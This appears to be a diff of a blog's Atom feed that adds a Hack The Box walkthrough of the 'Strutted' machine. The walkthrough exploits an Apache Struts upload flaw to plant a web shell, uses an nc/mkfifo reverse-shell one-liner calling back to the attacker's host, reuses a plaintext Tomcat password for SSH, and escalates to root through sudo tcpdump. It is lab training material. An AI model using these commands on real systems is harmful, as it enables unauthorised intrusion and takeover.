@@ -1,5 +1,422 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://blog.anotherplacein.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.anotherplacein.com/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-06-15T02:26:52+00:00</updated><id>https://blog.anotherplacein.com/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
-</subtitle><entry><title type="html">Underpass</title><link href="https://blog.anotherplacein.com/blog/2025/underpass/" rel="alternate" type="text/html" title="Underpass" /><published>2025-06-14T15:09:00+00:00</published><updated>2025-06-14T15:09:00+00:00</updated><id>https://blog.anotherplacein.com/blog/2025/underpass</id><content type="html" xml:base="https://blog.anotherplacein.com/blog/2025/underpass/"><![CDATA[<h1 id="underpass">Underpass</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://blog.anotherplacein.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://blog.anotherplacein.com/" rel="alternate" type="text/html" hreflang="en" /><updated>2025-06-20T01:54:01+00:00</updated><id>https://blog.anotherplacein.com/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
+</subtitle><entry><title type="html">Strutted</title><link href="https://blog.anotherplacein.com/blog/2025/strutted/" rel="alternate" type="text/html" title="Strutted" /><published>2025-06-19T15:09:00+00:00</published><updated>2025-06-19T15:09:00+00:00</updated><id>https://blog.anotherplacein.com/blog/2025/strutted</id><content type="html" xml:base="https://blog.anotherplacein.com/blog/2025/strutted/"><![CDATA[<h1 id="strutted">Strutted</h1>
+<p>Strutted begins with exploiting <a href="https://nvd.nist.gov/vuln/detail/cve-2024-53677">CVE 2024-53677</a> to gain initial access as the <code class="language-plaintext highlighter-rouge">tomcat</code> user. During enumeration, I discover credentials for the <code class="language-plaintext highlighter-rouge">james</code> user. With access to <code class="language-plaintext highlighter-rouge">james</code>, I escalate privileges by abusing a <code class="language-plaintext highlighter-rouge">sudo</code> permission that allows him to execute <code class="language-plaintext highlighter-rouge">tcpdump</code> as root, ultimately leading to root access.</p>
+
+<h2 id="nmap-scans">Nmap Scans</h2>
+<p>Using <code class="language-plaintext highlighter-rouge">nmap</code> I find nginx 1.18.0 running on port 80 and ssh running on port 22.  Port 80 redirects to <code class="language-plaintext highlighter-rouge">strutted.htb</code>.  I’ll add that to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/<span class="si">$(</span><span class="nb">cat </span>box<span class="si">)</span>.all.tcp.ports <span class="si">$(</span><span class="nb">cat </span>ip<span class="si">)</span>
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 21:36 EDT
+Nmap scan report for 10.10.11.59
+Host is up (0.12s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+</span><span class="gp">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://strutted.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 257.23 seconds
+
+</span></code></pre></div></div>
+<p>I add <code class="language-plaintext highlighter-rouge">strutted.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>vi /etc/hosts
+<span class="go">
+┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat</span> /etc/hosts
+<span class="go">127.0.0.1       localhost admin.sightless.htb
+127.0.1.1       kali
+
+10.10.11.59     strutted.htb
+
+
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+</span></code></pre></div></div>
+
+<h2 id="enumerating-port-80">Enumerating Port 80</h2>
+<h3 id="website_enum">website_enum</h3>
+<p>I run a script that scrapes potentially interesting information from the site.  Of note, it finds a link to <code class="language-plaintext highlighter-rouge">/download.action</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>website_enum http://<span class="si">$(</span><span class="nb">cat </span>ip<span class="si">)</span>
+<span class="go">~~~~~~~~Comments~~~~~~~~~~~~
+ Optional JavaScript
+~~~~~~END COMMENTS~~~~~~~~~~~
+~~~~~~~~LINKS~~~~~~~~~~~~~~~~
+/download.action
+</span><span class="gp">#</span><span class="w">
+</span><span class="go">/about
+/how
+~~~~~~~~~ACTION BUTTONS~~~~~~
+Input with type 'file' in form with method 'post' found.
+Input with type 'submit' in form with method 'post' found.
+</span></code></pre></div></div>
+<h3 id="dirsearch">dirsearch</h3>
+<p>Running <code class="language-plaintext highlighter-rouge">dirsearch</code> with default settings does not find any paths.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>dirsearch <span class="nt">-u</span> http://<span class="si">$(</span><span class="nb">cat </span>ip<span class="si">)</span>
+<span class="go">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/htb/strutted/writeup/reports/http_10.10.11.59/_25-06-15_17-11-20.txt
+
+Target: http://10.10.11.59/
+
+[17:11:20] Starting:
+
+Task Completed
+
+</span></code></pre></div></div>
+<h3 id="browser">Browser</h3>
+<p>Visiting the main page I see the website is serving a image sharing services.  The website provides a downloadable zip file that is useful for further enumeration.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>First I test out the image uploading feature.  I upload a small image.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>I note the image is uploaded to <code class="language-plaintext highlighter-rouge">strutted.htb/uploads/20250618_012810/test.png</code></p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>From <code class="language-plaintext highlighter-rouge">strutted.htb</code>, I click <code class="language-plaintext highlighter-rouge">Download</code> resulting in the downloading of <code class="language-plaintext highlighter-rouge">strutted.zip</code>.  I move the file to my current working directory and unzip it.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup/zip_files]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">mv</span> ~/Downloads/strutted.zip ./
+<span class="go">
+┌──(kali㉿kali)-[~/htb/strutted/writeup/zip_files]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">strutted.zip
+
+┌──(kali㉿kali)-[~/htb/strutted/writeup/zip_files]
+</span><span class="gp">└─$</span><span class="w"> </span>unzip strutted.zip
+<span class="go">Archive:  strutted.zip
+  inflating: Dockerfile
+  inflating: README.md
+  inflating: context.xml
+   creating: strutted/
+  inflating: strutted/pom.xml
+  inflating: strutted/mvnw.cmd
+  inflating: strutted/mvnw
+   creating: strutted/src/
+   creating: strutted/src/main/
+   creating: strutted/src/main/webapp/
+</span><span class="gp">&lt;snip&gt;</span><span class="w">
+</span></code></pre></div></div>
+<p>Looking at the file <code class="language-plaintext highlighter-rouge">strutted/pom.xml</code> I see that struts version 6.3.0.1 is being used.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/…/strutted/writeup/zip_files/strutted]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>pom.xml|grep <span class="nt">-i</span> struts
+<span class="gp">        &lt;struts2.version&gt;</span>6.3.0.1&lt;/struts2.version&gt;
+<span class="gp">                &lt;groupId&gt;</span>org.apache.struts&lt;/groupId&gt;
+<span class="gp">                &lt;artifactId&gt;</span>struts2-core&lt;/artifactId&gt;
+<span class="gp">                &lt;version&gt;</span><span class="k">${</span><span class="nv">struts2</span><span class="p">.version</span><span class="k">}</span>&lt;/version&gt;
+<span class="gp">                &lt;groupId&gt;</span>org.apache.struts&lt;/groupId&gt;
+<span class="gp">                &lt;artifactId&gt;</span>struts2-config-browser-plugin&lt;/artifactId&gt;
+<span class="gp">                &lt;version&gt;</span><span class="k">${</span><span class="nv">struts2</span><span class="p">.version</span><span class="k">}</span>&lt;/version&gt;
+<span class="gp">            &lt;groupId&gt;</span>org.apache.struts&lt;/groupId&gt;
+<span class="gp">            &lt;artifactId&gt;</span>struts2-core&lt;/artifactId&gt;
+<span class="go">
+</span></code></pre></div></div>
+<p>Notably, this version of Apache Struts is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/cve-2024-53677">CVE 2024-53677</a>. Using this publicly available <a href="https://github.com/EQSTLab/CVE-2024-53677">POC</a> as a reference, I crafted a payload in Burp Suite to exploit the vulnerability. The payload successfully uploads a webshell named shell.jsp. My modifications to the original POC focused on bypassing upload restrictions.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/burppayload.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>After submitting this post request, I have successfully uploaded a web shell executing commands as <code class="language-plaintext highlighter-rouge">tomcat</code>.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<p>I create a reverse shell script called <code class="language-plaintext highlighter-rouge">shell.sh</code> and server on port 80 from my machine.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>shell.sh
+<span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="gp">rm /tmp/f;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.16.8 9595 <span class="o">&gt;</span>/tmp/f
+<span class="go">
+┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span></code></pre></div></div>
+<p>I intercept the request to <code class="language-plaintext highlighter-rouge">shell.jsp</code> in Burp and use Repeater to issue a command that downloads <code class="language-plaintext highlighter-rouge">shell.sh</code> to the target machine.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.59 - - [18/Jun/2025 21:24:25] "GET /shell.sh HTTP/1.1" 200 -
+
+</span></code></pre></div></div>
+<p>I set up a <code class="language-plaintext highlighter-rouge">nc</code> listener on port 9595 and execute my reverse shell script using shell.jsp.</p>
+<div class="text-center">
+    <div class="img-fluid">
+        <figure>
+
+  <picture>
+    
+
+    <!-- Fallback to the original file -->
+    <img src="/assets/img/strutted/6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();" />
+
+  </picture>
+
+</figure>
+
+    </div>
+</div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 9595
+<span class="go">listening on [any] 9595 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.59] 42636
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">$</span><span class="w">
+</span></code></pre></div></div>
+<p>I upgrade my shell to be fully interactive.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash");'</span>
+<span class="gp">tomcat@strutted:~$</span><span class="w"> </span>^Z
+<span class="go">zsh: suspended  nc -lvnp 9595
+
+┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span> % 1
+<span class="go">[1]  + continued  nc -lvnp 9595
+                               export TERM=screen
+</span><span class="gp">tomcat@strutted:~$</span><span class="w"> </span><span class="nb">stty </span>rows 55 columns 230
+<span class="gp">tomcat@strutted:~$</span><span class="w">
+</span><span class="go">
+</span></code></pre></div></div>
+<h2 id="user-james">User james</h2>
+<p>Looking in the directory <code class="language-plaintext highlighter-rouge">/home</code> I see the home directory for the user <code class="language-plaintext highlighter-rouge">james</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@strutted:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> /home
+<span class="go">total 12
+drwxr-xr-x  3 root  root  4096 Jan 15 14:30 .
+drwxr-xr-x 18 root  root  4096 Jan 15 14:30 ..
+drwxr-x---  3 james james 4096 Jan 15 15:36 james
+</span></code></pre></div></div>
+<p>Looking in my current directory I see a <code class="language-plaintext highlighter-rouge">conf</code> directory.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@strutted:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 20
+drwxr-xr-x  5 root   root   4096 Jun 19 01:00 .
+drwxr-xr-x 41 root   root   4096 Jan 15 14:30 ..
+</span><span class="gp">lrwxrwxrwx  1 root   root     12 Jul 20  2022 conf -&gt;</span><span class="w"> </span>/etc/tomcat9
+<span class="go">drwxr-xr-x  2 tomcat tomcat 4096 Jan 15 14:30 lib
+</span><span class="gp">lrwxrwxrwx  1 root   root     17 Jul 20  2022 logs -&gt;</span><span class="w"> </span>../../log/tomcat9
+<span class="go">drwxr-xr-x  2 root   root   4096 Jun 19 01:00 policy
+drwxrwxr-x  3 tomcat tomcat 4096 Jan 15 14:30 webapps
+</span><span class="gp">lrwxrwxrwx  1 root   root     19 Jul 20  2022 work -&gt;</span><span class="w"> </span>../../cache/tomcat9
+</code></pre></div></div>
+<p>Inside of the conf directory I find the password <code class="language-plaintext highlighter-rouge">IT14d6SSP81k</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@strutted:~/conf$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-ir</span> pass <span class="nb">.</span>
+<span class="go">./tomcat-users.xml:  you must define such a user - the username and password are arbitrary.
+./tomcat-users.xml:  will also need to set the passwords to something appropriate.
+</span><span class="gp">./tomcat-users.xml:  &lt;user username="admin" password="&lt;must-be-changed&gt;</span><span class="s2">" roles="</span>manager-gui<span class="s2">"/&gt;
+</span><span class="gp">./tomcat-users.xml:  &lt;user username="robot" password="&lt;must-be-changed&gt;</span><span class="s2">"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"manager-script"</span>/&gt;
+<span class="gp">./tomcat-users.xml:  &lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;</span><span class="w">
+</span><span class="go">./tomcat-users.xml:  them. You will also need to set the passwords to something appropriate.
+</span><span class="gp">./tomcat-users.xml:  &lt;user username="tomcat" password="&lt;must-be-changed&gt;</span><span class="s2">" roles="</span>tomcat<span class="s2">"/&gt;
+</span><span class="gp">./tomcat-users.xml:  &lt;user username="both" password="&lt;must-be-changed&gt;</span><span class="s2">"</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">"tomcat,role1"</span>/&gt;
+<span class="gp">./tomcat-users.xml:  &lt;user username="role1" password="&lt;must-be-changed&gt;</span><span class="s2">" roles="</span>role1<span class="s2">"/&gt;
+</span><span class="gp">./catalina.properties:#</span><span class="w"> </span><span class="s2">passed to checkPackageAccess unless the
+</span><span class="gp">./catalina.properties:#</span><span class="w"> </span><span class="s2">passed to checkPackageDefinition unless the
+</span><span class="go">./server.xml:         analyzes the HTTP headers included with the request, and passes them
+./server.xml:      &lt;!-- Use the LockOutRealm to prevent attempts to guess user passwords
+</span><span class="gp">./web.xml:  &lt;!--                       pass the result to this style sheet residing   --&gt;</span><span class="w">
+</span><span class="gp">./web.xml:  &lt;!--                       pass the result to this style sheet which is   --&gt;</span><span class="w">
+</span><span class="gp">./web.xml:  &lt;!--                        work-around various issues when Java passes   --&gt;</span><span class="w">
+</span><span class="gp">./web.xml:  &lt;!--                        headers passed to the CGI process as          --&gt;</span><span class="w">
+</span><span class="gp">./web.xml:  &lt;!--   passShellEnvironment Should the shell environment variables (if    --&gt;</span><span class="w">
+</span><span class="gp">./web.xml:  &lt;!--                        any) be passed to the CGI script? [false]     --&gt;</span><span class="w">
+</span><span class="gp">./web.xml:        &lt;mime-type&gt;</span>application/vnd.blueice.multipass&lt;/mime-type&gt;
+<span class="go">
+</span></code></pre></div></div>
+<p>I successfully connect to the machine over ssh with the credentials <code class="language-plaintext highlighter-rouge">james:IT14d6SSP81k</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>ssh james@<span class="si">$(</span><span class="nb">cat </span>ip<span class="si">)</span>
+<span class="go">james@10.10.11.59's password:
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Jun 19 01:43:36 AM UTC 2025
+
+  System load:           0.12
+  Usage of /:            69.5% of 5.81GB
+  Memory usage:          10%
+  Swap usage:            0%
+  Processes:             223
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.59
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:23f0
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+5 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Tue Jan 21 13:46:18 2025 from 10.10.14.64
+</span><span class="gp">To run a command as administrator (user "root"), use "sudo &lt;command&gt;</span><span class="s2">".
+</span><span class="go">See "man sudo_root" for details.
+
+</span><span class="gp">james@strutted:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>The user <code class="language-plaintext highlighter-rouge">james</code> is able to read the user flag.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 28
+drwxr-x--- 3 james james 4096 Jan 15 15:36 .
+drwxr-xr-x 3 root  root  4096 Jan 15 14:30 ..
+</span><span class="gp">lrwxrwxrwx 1 root  root     9 Jan 11 13:50 .bash_history -&gt;</span><span class="w"> </span>/dev/null
+<span class="go">-rw-r--r-- 1 james james  220 Jan 11 13:07 .bash_logout
+-rw-r--r-- 1 james james 3771 Jan 11 13:07 .bashrc
+drwx------ 2 james james 4096 Jan 15 15:24 .cache
+-rw-r--r-- 1 james james  807 Jan 11 13:07 .profile
+-rw-r----- 1 root  james   33 Jun 19 01:07 user.txt
+</span><span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt |wc
+<span class="go">      1       1      33
+</span></code></pre></div></div>
+<h2 id="root">Root</h2>
+<p>The user <code class="language-plaintext highlighter-rouge">james</code> can execute <code class="language-plaintext highlighter-rouge">tcpdump</code> as root.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for james on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User james may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump
+
+</span></code></pre></div></div>
+<p><a href="https://gtfobins.github.io/gtfobins/tcpdump/">GTFOBins</a> has a documented way to escalate privileges given the user can execute <code class="language-plaintext highlighter-rouge">tcpdump</code> as root.  Below I use the method described by GTFOBins to get a reverse shell as root.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nv">RESHELL</span><span class="o">=</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.8 9595 &gt;/tmp/f'</span>
+<span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>
+<span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$RESHELL</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>
+<span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="nv">$TF</span>
+<span class="gp">james@strutted:~$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> lo <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> <span class="nv">$TF</span> <span class="nt">-Z</span> root
+<span class="go">tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+4 packets received by filter
+0 packets dropped by kernel
+rm: cannot remove '/tmp/f': No such file or directory
+
+</span></code></pre></div></div>
+<p>This shell is caught on my local machine.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌──(kali㉿kali)-[~/htb/strutted/writeup]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 9595          
+<span class="go">listening on [any] 9595 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.59] 52712
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">#</span><span class="w"> 
+</span><span class="go">
+</span></code></pre></div></div>
+<p>This shell has root access on the box and can read the root flag.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">cd</span> /root
+<span class="gp">#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">root.txt
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt |wc
+<span class="go">      1       1      33
+
+
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="struts" /><category term="hack-the-box" /><category term="medium" /><summary type="html"><![CDATA[A walkthrough of HackTheBox's Strutted]]></summary></entry><entry><title type="html">Underpass</title><link href="https://blog.anotherplacein.com/blog/2025/underpass/" rel="alternate" type="text/html" title="Underpass" /><published>2025-06-14T15:09:00+00:00</published><updated>2025-06-14T15:09:00+00:00</updated><id>https://blog.anotherplacein.com/blog/2025/underpass</id><content type="html" xml:base="https://blog.anotherplacein.com/blog/2025/underpass/"><![CDATA[<h1 id="underpass">Underpass</h1>
 <p>The Underpass machine hosts a DaloRadius server with default credentials. Logging in reveals a username and a hashed password, which can be cracked to gain SSH access. Once on the machine, the user can launch a Mosh server as root and connect to it, ultimately gaining full root access.</p>
 
 <h2 id="nmap-scan">nmap scan</h2>
